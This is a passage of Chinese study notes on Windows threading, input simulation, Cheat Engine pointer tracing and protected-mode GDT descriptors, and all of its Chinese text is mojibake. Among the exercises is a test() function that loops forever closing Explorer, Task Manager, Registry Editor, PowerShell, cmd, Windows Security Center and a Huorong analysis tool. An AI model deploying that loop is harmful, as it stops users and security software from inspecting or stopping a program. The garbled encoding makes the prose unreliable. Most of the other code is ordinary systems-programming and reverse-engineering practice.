å°æ˜èµ°åˆ°ç™½æ¿å‰ï¼Œçœ‹åˆ°ä¸Šé¢å†™ç€ â€œ0â€ï¼Œå¿ƒé‡Œè®°ä½äº† â€œç°åœ¨æ˜¯ 0â€ã€‚ å°çº¢ä¹Ÿæƒ³åŠ  1ï¼š å‡ ä¹åŒæ—¶ï¼Œå°çº¢ä¹Ÿèµ°åˆ°ç™½æ¿å‰ï¼Œä¹Ÿçœ‹åˆ°äº†ä¸Šé¢å†™ç€ â€œ0â€ï¼Œå¥¹ä¹Ÿè®°ä½äº† â€œç°åœ¨æ˜¯ 0â€ã€‚ å°æ˜å†™ä¸‹æ–°æ•°å­—ï¼š å°æ˜å¿ƒç®—äº†ä¸€ä¸‹ 0 + 1 = 1ï¼Œç„¶åæ‹¿èµ·ç¬”ï¼ŒæŠŠç™½æ¿ä¸Šçš„ â€œ0â€ æ“¦æ‰ï¼Œå†™ä¸Šäº† â€œ1â€ã€‚ å°çº¢ä¹Ÿå†™ä¸‹æ–°æ•°å­—ï¼š å°çº¢ä¹Ÿå¿ƒç®—äº†ä¸€ä¸‹ 0 + 1 = 1 ï¼ˆæ³¨æ„ï¼Œå¥¹çœ‹åˆ°çš„æ˜¯ä¹‹å‰çš„ â€œ0\"ï¼Œè€Œä¸æ˜¯å°æ˜åˆšå†™çš„ â€œ1\"ï¼‰ï¼Œç„¶åå¥¹ä¹Ÿæ‹¿èµ·ç¬”ï¼ŒæŠŠç™½æ¿ä¸Šçš„ â€œ0â€ ï¼ˆå¦‚æœè¿˜æ²¡è¢«æ“¦æ‰ï¼‰æˆ–è€… â€œ1â€ ï¼ˆå¦‚æœå·²ç»è¢«å°æ˜å†™ä¸Šäº†ï¼Œä½†æ˜¯å°çº¢æ²¡æ³¨æ„åˆ°ï¼‰æ“¦æ‰ï¼Œä¹Ÿå†™ä¸Šäº† â€œ1\"ã€‚ ç»“æœï¼š æœ¬æ¥æˆ‘ä»¬å¸Œæœ›å°æ˜å’Œå°çº¢éƒ½åŠ ä¸€æ¬¡ 1ï¼Œç™½æ¿ä¸Šåº”è¯¥å˜æˆ â€œ2\"ï¼Œä½†æ˜¯ç”±äºä»–ä»¬å‡ ä¹åŒæ—¶æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰â€œåè°ƒå¥½â€ï¼Œç»“æœç™½æ¿ä¸Šæœ€ç»ˆåªæ˜¾ç¤ºäº† â€œ1\"ã€‚ æœ‰ä¸€æ¬¡åŠ  1 çš„æ“ä½œ â€œä¸¢å¤±â€ äº†ï¼\nä¸´ç•ŒåŒº é€šè¿‡ä½¿ç”¨ä¸´ç•ŒåŒºå®ç°ä¸€ä¸ªæ­»é”ç¨‹åº\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e CRITICAL_SECTION cs1; CRITICAL_SECTION cs2; DWORD WINAPI ThreadProc1(LPVOID lpParameter) { printf(\"1\\n\"); EnterCriticalSection(\u0026cs1); Sleep(10000); EnterCriticalSection(\u0026cs2); LeaveCriticalSection(\u0026cs2); LeaveCriticalSection(\u0026cs1); printf(\"1 1\\n\"); return 0; } DWORD WINAPI ThreadProc2(LPVOID lpParameter) { printf(\"2\\n\"); EnterCriticalSection(\u0026cs2); Sleep(100); EnterCriticalSection(\u0026cs1); LeaveCriticalSection(\u0026cs1); LeaveCriticalSection(\u0026cs2); printf(\"2 2\\n\"); return 0; } int main(int argc, char* argv[]) { InitializeCriticalSection(\u0026cs1); InitializeCriticalSection(\u0026cs2); //åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1,NULL, 0, NULL); //åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2,NULL, 0, NULL); Sleep(100); //å¦‚æœä¸åœ¨å…¶ä»–çš„åœ°æ–¹å¼•ç”¨å®ƒ å…³é—­å¥æŸ„ ::CloseHandle(hThread1); ::CloseHandle(hThread2); DeleteCriticalSection(\u0026cs1); DeleteCriticalSection(\u0026cs2); return 0; } ä¼šå‘ç°è¾“å‡ºä¸­æ²¡æœ‰1 1å’Œ2 2ã€‚\näº’æ–¥ä½“ ç¬¬ä¸€æ­¥ï¼šåœ¨ç¬¬ä¸€ä¸ªæ–‡æœ¬æ¡†ä¸­è¾“å…¥ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚1000ã€‚ ç¬¬äºŒæ­¥ï¼šç‚¹å‡»æŠ¢çº¢åŒ…ï¼ŒåŒæ—¶åˆ›å»º3ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹å¾ªç¯è¿›è¡ŒæŠ¢çº¢åŒ…çš„æ“ä½œï¼Œæ¯æ¬¡æŠ¢50ã€‚ ç¬¬ä¸‰æ­¥ï¼šä½¿ç”¨Mutexè¿›è¡Œçº¿ç¨‹æ§åˆ¶ï¼Œå½“ç¬¬ä¸€ä¸ªæ–‡æœ¬æ¡†ä¸­çš„å€¼\u003c50æ—¶ï¼Œå¼ºçº¢åŒ…çº¿ç¨‹ç»“æŸã€‚ ç‰¹åˆ«è¯´æ˜ï¼š 1ã€å››ä¸ªæ–‡æœ¬æ¡†ä¸­çš„å€¼æ€»å’Œåº”è¯¥ä¸º1000 2ã€å¼ºçº¢åŒ…çº¿ç¨‹æ¯æ¬¡å»¶æ—¶50æ¯«ç§’ã€‚ 3ã€ä½¿ç”¨WaitForMultipleObjectsç›‘å¬æ‰€æœ‰çº¿ç¨‹ï¼Œå½“çº¿ç¨‹å…¨éƒ¨ç»“æŸåè°ƒç”¨CloseHandleå…³é—­å¥æŸ„ã€‚\n// test.cpp : Defines the entry point for the application. // #include \"stdafx.h\" #include \"resource.h\" #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e HWND main_hwnd; HWND hwnd_A; HWND hwnd_B; HWND hwnd_C; HANDLE g_hMutex; DWORD WINAPI startnew_thread1(LPVOID lpParameter); DWORD WINAPI startnew_thread2(LPVOID lpParameter); DWORD WINAPI startnew_thread3(LPVOID lpParameter); DWORD WINAPI startnew_thread1(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_A, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_A, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew_thread2(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_B, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_B, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew_thread3(LPVOID lpParameter) { TCHAR szBuffer[10]; DWORD total_amount; DWORD thread_amount; while (TRUE) { WaitForSingleObject(g_hMutex, INFINITE); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(main_hwnd, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026total_amount); if (total_amount \u003c 50) { ReleaseMutex(g_hMutex); break; } sprintf(szBuffer, \"%d\", total_amount - 50); SetWindowText(main_hwnd, szBuffer); memset(szBuffer, 0, sizeof(szBuffer)); GetWindowText(hwnd_C, szBuffer, sizeof(szBuffer) / sizeof(szBuffer[0])); sscanf(szBuffer, \"%d\", \u0026thread_amount); sprintf(szBuffer, \"%d\", thread_amount + 50); SetWindowText(hwnd_C, szBuffer); ReleaseMutex(g_hMutex); Sleep(50); } return 0; } DWORD WINAPI startnew(LPVOID lpParameter) { g_hMutex = CreateMutex(NULL, FALSE, \"XYZ\"); if (g_hMutex == NULL) { MessageBox(NULL, TEXT(\"error\"), TEXT(\"error\"), MB_ICONERROR); return 1; } HANDLE hThread1 = ::CreateThread(NULL, 0, startnew_thread1, NULL, 0, NULL); HANDLE hThread2 = ::CreateThread(NULL, 0, startnew_thread2, NULL, 0, NULL); HANDLE hThread3 = ::CreateThread(NULL, 0, startnew_thread3, NULL, 0, NULL); HANDLE hThreads[3] = {hThread1, hThread2, hThread3}; WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); ::CloseHandle(hThread1); ::CloseHandle(hThread2); ::CloseHandle(hThread3); ::CloseHandle(g_hMutex); g_hMutex = NULL; return 0; } BOOL CALLBACK DialogProc( HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ) { switch (uMsg) { case WM_INITDIALOG: { main_hwnd = GetDlgItem(hwndDlg, IDC_EDIT_total); SetWindowText(main_hwnd, TEXT(\"1000\")); hwnd_A = GetDlgItem(hwndDlg, IDC_EDIT_1); // çº¿ç¨‹1æ–‡æœ¬æ¡† SetWindowText(hwnd_A, TEXT(\"0\")); hwnd_B = GetDlgItem(hwndDlg, IDC_EDIT_2); // çº¿ç¨‹2æ–‡æœ¬æ¡† SetWindowText(hwnd_B, TEXT(\"0\")); hwnd_C = GetDlgItem(hwndDlg, IDC_EDIT_3); // çº¿ç¨‹3æ–‡æœ¬æ¡† SetWindowText(hwnd_C, TEXT(\"0\")); } return TRUE; case WM_COMMAND: { switch (LOWORD(wParam)) { case IDC_BUTTON: // æŒ‰é’®ç‚¹å‡»äº‹ä»¶ HANDLE hThreadButton = ::CreateThread(NULL, 0, startnew, NULL, 0, NULL); ::CloseHandle(hThreadButton); return TRUE; } } break; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; } return FALSE; } int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) { // TODO: Place code here. DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DialogProc); return 0; } é¼ æ ‡_é”®ç›˜ ç»ƒä¹ ï¼š\néå†æ‰€æœ‰æ‰“å¼€çª—å£ï¼Œç­‰å¾… è®¾ç½®é¼ æ ‡ä½ç½®ï¼Œç‚¹å‡» æ¨¡æ‹Ÿé”®ç›˜è¾“å…¥å¯†ç  è®¾ç½®é¼ æ ‡ä½ç½®ï¼Œå•å‡»ç™»å½• #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e int main() { //ShowWindow(GetConsoleWindow(), SW_HIDE); STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi; si.cb = sizeof(si); RECT windowRect; BOOL res = CreateProcess( TEXT(\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsNotepad_11.2410.21.0_x64__8wekyb3d8bbwe\\\\Notepad\\\\Notepad.exe\"), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, \u0026si, \u0026pi); HWND hwnd = FindWindow(NULL, TEXT(\"Notepad\")); if (GetWindowRect(hwnd, \u0026windowRect)) { int centerX = windowRect.left + (windowRect.right - windowRect.left) / 2; int centerY = windowRect.top + (windowRect.bottom - windowRect.top) / 2; if (SetCursorPos(centerX, centerY)) { } else { return 1; } } else { return 1; } Sleep(1000); mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0); keybd_event(16,0,0,0); keybd_event(67,0,0,0); keybd_event(67,0,KEYEVENTF_KEYUP,0); keybd_event(16,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(54,0,0,0); keybd_event(54,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(53,0,0,0); keybd_event(53,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(77,0,0,0); keybd_event(77,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(65,0,0,0); keybd_event(65,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(69,0,0,0); keybd_event(69,0,KEYEVENTF_KEYUP,0); Sleep(100); keybd_event(76,0,0,0); keybd_event(76,0,KEYEVENTF_KEYUP,0); return 0; } void test() { while (true) { TCHAR szTitle[MAX_PATH] = {0}; HWND hwnd1 = ::FindWindow(NULL,TEXT(\"æ–‡ä»¶èµ„æºç®¡ç†å™¨\")); HWND hwnd2 = ::FindWindow(NULL,TEXT(\"ç«ç»’å®‰å…¨åˆ†æå·¥å…·\")); HWND hwnd3 = ::FindWindow(NULL,TEXT(\"è®¾ç½®\")); HWND hwnd4 = ::FindWindow(NULL,TEXT(\"Windows å®‰å…¨ä¸­å¿ƒ\")); HWND hwnd5 = ::FindWindow(NULL,TEXT(\"æ³¨å†Œè¡¨ç¼–è¾‘å™¨\")); HWND hwnd6 = ::FindWindow(NULL,TEXT(\"Windows PowerShell\")); HWND hwnd7 = ::FindWindow(NULL,TEXT(\"å‘½ä»¤æç¤ºç¬¦\")); HWND hwnd8 = ::FindWindow(NULL,TEXT(\"ä»»åŠ¡ç®¡ç†å™¨\")); SwitchToThisWindow(hwnd1,false); SwitchToThisWindow(hwnd2,false); SwitchToThisWindow(hwnd3,false); SwitchToThisWindow(hwnd4,false); SwitchToThisWindow(hwnd5,false); SwitchToThisWindow(hwnd6,false); SwitchToThisWindow(hwnd7,false); SwitchToThisWindow(hwnd8,false); if(hwnd1 != NULL || hwnd2 != NULL || hwnd3 != NULL || hwnd4 != NULL || hwnd5 != NULL || hwnd6 != NULL || hwnd7 != NULL || hwnd8 != NULL) { ::SendMessage(hwnd1,WM_CLOSE,0,0); ::SendMessage(hwnd2,WM_CLOSE,0,0); ::SendMessage(hwnd3,WM_CLOSE,0,0); ::SendMessage(hwnd4,WM_CLOSE,0,0); ::SendMessage(hwnd5,WM_CLOSE,0,0); ::SendMessage(hwnd6,WM_CLOSE,0,0); ::SendMessage(hwnd7,WM_CLOSE,0,0); ::SendMessage(hwnd8,WM_CLOSE,0,0); } Sleep(100); } } CE ç¬¬å…«é¢˜\né¦–å…ˆæ‰¾åˆ°æ˜¯è°ä¿®æ”¹äº†è¿™ä¸ªå€¼\nRAX=00000DD5 RBX=015F7270 RCX=E2A9C98E RDX=066FC98E RSI=01632ED0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E94D æŒ‡é’ˆåŸºå€å¯èƒ½æ˜¯ =01632ED0 10002E940 - mov ecx,00000FA0 10002E945 - call 10000FC10 10002E94A - mov [rsi+18],eax \u003c---- 10002E94D - lea rcx,[rbp-08] 10002E951 - call 100008F10 å¯ä»¥çœ‹åˆ°æ˜¯eaxå‘[rsi+18]èµ‹å€¼ï¼Œä¸ºä»€ä¹ˆè¦æ‰¾rsiè€Œä¸æ˜¯eaxï¼Ÿ\nå…³æ³¨rsiæ˜¯å› ä¸ºå®ƒæŒ‡å‘å­˜å‚¨æ•°æ®çš„å†…å­˜ç»“æ„ï¼Œå…¶æ¥æºå¯é€šè¿‡æŒ‡é’ˆé“¾å…³è”åˆ°é™æ€åŸºå€ï¼›è€Œeaxä»…æ˜¯ä¸€ä¸ªä¸´æ—¶æ•°å€¼ï¼Œæ— æ³•ç”¨äºåŸºå€å®šä½ã€‚é€šè¿‡è¿½è¸ªrsiçš„èµ‹å€¼é€»è¾‘ï¼Œæ‰èƒ½æ‰¾åˆ°ç¨³å®šçš„åŸºå€è¡¨è¾¾å¼ã€‚\nç”±äºç›®å‰rsié‡Œé¢çš„å€¼æœ‰å¯èƒ½ç›´æ¥æ˜¯åŸºå€ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ–°ä¸€çº§çš„åç§»ï¼ˆæ¯”å¦‚[åŸºå€ + 0x100]ï¼‰ï¼›æ˜¯æ–°ä¸€çº§çš„åç§»çš„è¯å°±ä¸èƒ½ç›´æ¥é€šè¿‡0x1632ED0å»å¯»æ‰¾äº†ï¼Œè€Œæ˜¯è¦æ ¹æ®å‡å»åç§»åçš„å€¼å»å¯»æ‰¾ã€‚\nç›´æ¥æ‰¾è°ä¿®æ”¹äº†å®ƒå‘ç°æ²¡æœ‰äººä¿®æ”¹å®ƒï¼Œå°±çœ‹è°è®¿é—®äº†å®ƒï¼ˆè¿™ä¸ªå®ƒå°±æ˜¯æ ¹æ®0x1632ED0è¿›è¡Œæ–°æœç´¢çš„åœ°å€ï¼Œåˆ¤æ–­å®ƒç›´æ¥æ˜¯åŸºå€è¿˜æ˜¯åç§»ï¼‰ï¼š\nè¿™æ—¶æœ‰ä¸¤æ¡æŒ‡ä»¤è®¿é—®äº†å®ƒï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯è®¿é—®å®ƒè¿›è¡Œæ¯”è¾ƒï¼Œæ²¡æœ‰ä»·å€¼ã€‚æˆ‘ä»¬çœ‹å¦å¤–ä¸€ä¸ªï¼š\nRAX=0164AF60 RBX=015F7270 RCX=015F7270 RDX=0000185A RSI=01632ED0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E90B æŒ‡é’ˆåŸºå€å¯èƒ½æ˜¯ =01632ED0 10002E900 - je 10002E9A7 10002E906 - nop 2 10002E908 - mov rsi,[rsi] \u003c---- 10002E90B - mov rax,rsi 10002E90E - mov edx,[rax+04] è¿™æ˜¯å°†rsiåœ°å€çš„å€¼èµ‹ç»™rsiã€‚\nå‘ç°å®ƒæ²¡æœ‰åç§»ï¼Œé‚£ä¹ˆå°±ç›´æ¥ç”¨0x1632ED0åœ°å€çš„å€¼ï¼ˆ0x164AF60ï¼‰å†æ¬¡è¿›è¡Œæœç´¢ï¼ŒåŒæ ·å…ˆçœ‹ä¸€ä¸‹è°è®¿é—®äº†å®ƒï¼š\nRAX=0164AEE0 RBX=015F7270 RCX=015F7270 RDX=00011DB9 RSI=0164AF60 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E8C0 æŒ‡é’ˆåŸºå€å¯èƒ½æ˜¯ =0164AEE0 10002E8B5 - je 10002E9A7 10002E8BB - nop 10002E8BC - mov rsi,[rsi+18] \u003c---- 10002E8C0 - mov rax,rsi 10002E8C3 - mov edx,[rax+0C] è¿™æ˜¯å°†rsi+0x18åœ°å€çš„å€¼èµ‹ç»™rsiã€‚è¿™æ—¶å°±ä¸èƒ½ç”¨0x164AF60åœ°å€çš„å€¼ï¼ˆ0x164AEF8ï¼‰ç›´æ¥æœç´¢ï¼Œå› ä¸ºæœ‰0x18çš„åç§»ã€‚\næ‰€ä»¥ç”¨0x164AEE0å†æ¬¡è¿›è¡Œæœç´¢ï¼ŒåŒæ ·å…ˆçœ‹ä¸€ä¸‹è°è®¿é—®äº†å®ƒï¼š\nRAX=01632C50 RBX=015F7270 RCX=015F7270 RDX=00001C5A RSI=0164AEE0 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E878 æŒ‡é’ˆåŸºå€å¯èƒ½æ˜¯ =01632C50 10002E86D - je 10002E9A7 10002E873 - nop 10002E874 - mov rsi,[rsi+10] \u003c---- 10002E878 - mov rax,rsi 10002E87B - mov edx,[rax+04] åŒä¸Šï¼Œæ‰€ä»¥å°±ç›´æ¥ç”¨0x1632C50å†æ¬¡è¿›è¡Œæœç´¢ï¼ŒåŒæ ·å…ˆçœ‹ä¸€ä¸‹è°è®¿é—®äº†å®ƒï¼š\nRAX=015FBAB0 RBX=015F7270 RCX=015F7270 RDX=015FBAB0 RSI=01632C50 RDI=100290098 RBP=013FEE40 RSP=013FED00 RIP=10002E82D æŒ‡é’ˆåŸºå€å¯èƒ½æ˜¯ =100325B00 10002E81D - mov qword ptr [rbp-08],00000000 10002E825 - nop 10002E826 - mov rsi,[100325B00] \u003c---- 10002E82D - mov rax,rsi 10002E830 - mov edx,[rax+04] è¿™æ˜¯å¯ä»¥çœ‹åˆ°å·²ç»ä¸æ˜¯åç§»äº†ï¼Œè€Œæ˜¯ç¡¬ç¼–ç çš„åœ°å€ï¼Œå°±æ˜¯å‘è¿™ä¸ªåœ°å€è¿›è¡Œèµ‹å€¼çš„ã€‚ç»¼ä¸Šæ‰¾åˆ°çš„ç»“æ„ä¸ºï¼š\n[[[[[100325B00]+10]+18]]+18] = eax æˆ‘ä»¬éœ€è¦æ„é€ è¿™ä¸ªç»“æ„å»ç›´æ¥æ‰¾åˆ°è¢«èµ‹å€¼çš„ä½ç½®ï¼Œåœ¨ceä¸­æ‰‹åŠ¨æ·»åŠ åœ°å€ï¼š\nå°±å¯ä»¥çœ‹åˆ°æ­£å¸¸æ˜¾ç¤ºæ•°å€¼äº†ï¼Œå³ä½¿æ”¹å˜æŒ‡é’ˆä¹Ÿä¸æ€•äº†ã€‚\nä¿æŠ¤æ¨¡å¼ æ®µæè¿°ç¬¦ä¸æ®µé€‰æ‹©å­ åœ¨windbgä¸­æŸ¥çœ‹GDTè¡¨çš„åŸºå€å’Œé•¿åº¦\næŸ¥çœ‹xpçš„GDTè¡¨\n0: kd\u003e r gdtr gdtr=8003f000\t#åŸºå€ 0: kd\u003e r gdtl gdtl=000003ff\t#é•¿åº¦ åˆ†åˆ«ä½¿ç”¨dd dqæŒ‡ä»¤æŸ¥çœ‹GDTè¡¨\n0: kd\u003e dd 8003f000 ReadVirtual: 8003f000 not properly sign extended 8003f000 00000000 00000000 0000ffff 00cf9b00 8003f010 0000ffff 00cf9300 0000ffff 00cffb00 8003f020 0000ffff 00cff300 200020ab 80008b04 8003f030 f0000001 ffc093df 00000fff 0040f300 8003f040 0400ffff 0000f200 00000000 00000000 8003f050 27000068 80008955 27680068 80008955 8003f060 2f40ffff 00009302 80003fff 0000920b 8003f070 700003ff ff0092ff 0000ffff 80009a40 0: kd\u003e dq 8003f000 ReadVirtual: 8003f000 not properly sign extended 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff æ®µæè¿°ç¬¦æŸ¥åˆ†å®éªŒï¼šæ‹†5ä¸ª\n00cf9b00`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=1011 Address=0000 00cf9300`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=0011 Address=0000 00cffb00`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=1011 Address=0000 00cff300`0000ffff\nBase=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11(3) s=1 Type=0011 Address=0000 80008b04`200020ab\nBase=80 04 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 20ab 16~12 [8]=1000 p=1 DPL=00 s=0 Type=1011 Address=2000 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008954`af000068 80008954`af680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 8003f080 80009240`0000ffff 00009200`00000000 00cf9b00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[b]=1011 Address=0000 00cf9300`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=0000 00cffb00`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[b]=1011 Address=0000 00cff300`0000ffff Base=00 00 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=f ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[3]=0011 Address=0000 80008b04`200020ab Base=80 04 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 20ab 16~12 [8]=1000 p=1 DPL=00 s=0 Type=[b]=1011 Address=2000 ffc093df`f0000001 Base=ff df 23~20 [c]= 1100 G=1 D/B=1 AVL=0 Limit=0 0001 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=f000 0040f300`00000fff Base=00 00 23~20 [4]= 0100 G=0 D/B=1 AVL=0 Limit=0 0fff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[3]=0011 Address=0000 0000f200`0400ffff Base=00 00 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [f]=1111 p=1 DPL=11 s=1 Type=[2]=0010 Address=0400 80008954`af000068 Base=80 54 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0068 16~12 [8]=1000 p=1 DPL=00 s=0 Type=[9]=1001 Address=af00 00009302`2f40ffff Base=00 02 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[3]=0011 Address=2f40 ff0092ff`700003ff Base=ff ff 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 03ff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0010 Address=7000 80009a40`0000ffff Base=80 40 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[a]=1001 Address=0000 80009240`0000ffff Base=80 40 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 ffff 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0011 Address=0000 00009200`00000000 Base=00 00 23~20 [0]= 0000 G=0 D/B=0 AVL=0 Limit=0 0000 16~12 [9]=1001 p=1 DPL=00 s=1 Type=[2]=0011 Address=0000 æ®µé€‰æ‹©å­æ‹†åˆ†å®éªŒï¼š\n23\n0010 0011 RPL=11(3) TI=0 Index=0010 0(4) 2B\n0010 1011 RPL=11(3) TI=0 Index=0010 1(5) 30\n0011 0000 RPL=00 TI=0 Index=0011 0(6) 3B\n0011 1011 RPL=11(3) TI=0 Index=0011 1(7) 53\n0101 0011 RPL=11(3) TI=0 Index=0101 0(10) ä½¿ç”¨LESï¼ŒLDSç­‰æŒ‡ä»¤ä¿®æ”¹æ®µå¯„å­˜å™¨\nLES ebx, [SI]å°±æ˜¯é«˜ä¸¤å­—èŠ‚ç»™esï¼Œä½4å­—èŠ‚ç»™ebx\næ®µæè¿°ç¬¦å±æ€§Pä½_Gä½ æŸ¥GDTè¡¨ï¼Œå¦‚ä½•å¿«é€Ÿç¡®å®šå“ªä¸ªæè¿°ç¬¦çš„Pä½ä¸º0æˆ–è€…ä¸º1\nå¯ä»¥æ£€æµ‹æ®µæè¿°ç¬¦çš„ç¬¬5ä½ï¼Œå¦‚æœå¤§äºç­‰äº8åˆ™Pä¸º1ï¼Œå¦åˆ™Pä¸º0\næ¯”å¦‚ï¼š00cf9b00`0000ffff\næŸ¥GDTè¡¨ï¼Œå¦‚ä½•å¿«é€Ÿç¡®å®šå“ªä¸ªæè¿°ç¬¦çš„Gä½ä¸º0æˆ–è€…ä¸º1\nå¯ä»¥æ£€æµ‹æ®µæè¿°ç¬¦çš„ç¬¬3ä½ï¼Œå¦‚æœå¤§äºç­‰äº8åˆ™Gä¸º1ï¼Œå¦åˆ™Gä¸º0\næ¯”å¦‚ï¼š00cf9b00`0000ffff\nå°†æ®µæè¿°ç¬¦å¡«å†™åˆ°æ®µå¯„å­˜å™¨ç»“æ„ä½“ä¸­ï¼ˆæ¯äººå¡«ä¸€ä¸ªï¼‰(æ®µé€‰æ‹©å­ï¼š23 2B 30 3B 53)\næ¯”å¦‚æˆ‘ç”¨xpçš„GDTè¡¨åšä¸€ä¸‹ï¼š\n8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 0040f300`00000fff 8003f040 0000f200`0400ffff 00000000`00000000 8003f050 80008955`27000068 80008955`27680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 23 0010 0011 Index=00100(4) --\u003e 00cff300`0000ffff 00cff300`0000ffff Base=00 00 23~20 [c]= 1101 G=1 D/B=1 AVL=1 